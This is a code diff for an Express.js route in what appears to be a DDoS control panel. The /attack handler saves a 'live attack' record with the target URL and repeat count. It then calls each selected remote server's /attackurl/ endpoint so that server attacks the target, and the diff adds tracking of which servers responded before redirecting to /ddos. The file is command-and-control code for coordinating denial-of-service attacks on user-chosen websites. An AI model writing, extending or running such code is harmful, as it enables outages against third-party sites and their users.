@@ -1,6 +1,7 @@
 module.exports = (app, functions, isLoggedIn) => {
     const dbServer = require('../../models/serverSchema.js')
     const dbAttack = require('../../models/attackInfoSchema')
+    const dbLiveAttack = require('../../models/attackLiveSchema')
 
     // -----[Attack]-----
     app.get('/attack', isLoggedIn, async (req, res) => {
@@ -9,28 +10,76 @@ module.exports = (app, functions, isLoggedIn) => {
     });
 
     app.post('/attack', isLoggedIn, async (req, res) => {
+        let serverAttackList = [];
+        let promises = [];
+
         const server = await dbServer.find();
-        if (typeof (req.body.name) == "object") {
+        const element = new dbLiveAttack({
+            url: `${req.body.Url}.${req.body.Dom}`,
+            times: req.body.Times,
+            timesRealized: 0,
+            time: "",
+            hourStart: new Date()
+        })
+
+        await element.save();
+
+        if (typeof req.body.name === "object") {
             for (let i = 0; i < server.length; i++) {
                 for (let a = 0; a < req.body.name.length; a++) {
                     if (req.body.name[a] == server[i]._id) {
-                        fetch(`http://${server[i].Url}/attackurl/${req.body.Url}/${req.body.Dom}/${req.body.Times}/${server[i]._id}`)
+                        let promise = fetch(`http://${server[i].Url}/attackurl/${req.body.Url}/${req.body.Dom}/${req.body.Times}/${server[i]._id}`)
                             .catch(() => {
                                 console.log("[Server] The server is offline: " + server.Url);
+                            })
+                            .then(() => {
+                                serverAttackList.push(server[i].id);
+                                console.log("push-> " + server[i].id);
                             });
+        
+                        promises.push(promise);
                     }
                 }
             }
-        } else if (typeof (req.body.name) == "string") {
+        } else if (typeof req.body.name === "string") {
             for (let i = 0; i < server.length; i++) {
                 if (server[i]._id == req.body.name) {
-                    fetch(`http://${server[i].Url}/attackurl/${req.body.Url}/${req.body.Dom}/${req.body.Times}/${server[i]._id}`)
+                    let promise = fetch(`http://${server[i].Url}/attackurl/${req.body.Url}/${req.body.Dom}/${req.body.Times}/${server[i]._id}`)
                         .catch(() => {
                             console.log("[Server] The server is offline: " + server.Url);
+                        })
+                        .then(() => {
+                            serverAttackList.push(server[i].id);
+                            console.log("push-> " + server[i].id);
                         });
+        
+                    promises.push(promise);
                 }
             }
         }
+        
+        // Esperar a que todas las promesas se resuelvan antes de continuar
+        Promise.all(promises)
+            .then(async () => {
+                console.log("Final serverAttackList: ", serverAttackList);
+
+                for (let i = 0; i < serverAttackList.length; i++) {
+                    await dbLiveAttack.findOneAndUpdate({ _id: element.id }, {
+                        $push: {
+                            'servers': {
+                                serverID: serverAttackList[i]
+                            }
+                        }
+                    })
+                }                
+
+                const element2 = await dbLiveAttack.findById(element.id);
+                console.log(element2)
+            })
+            .catch((error) => {
+                console.error("Error while processing promises: ", error);
+            });
+
         res.redirect('/ddos');
     });
 
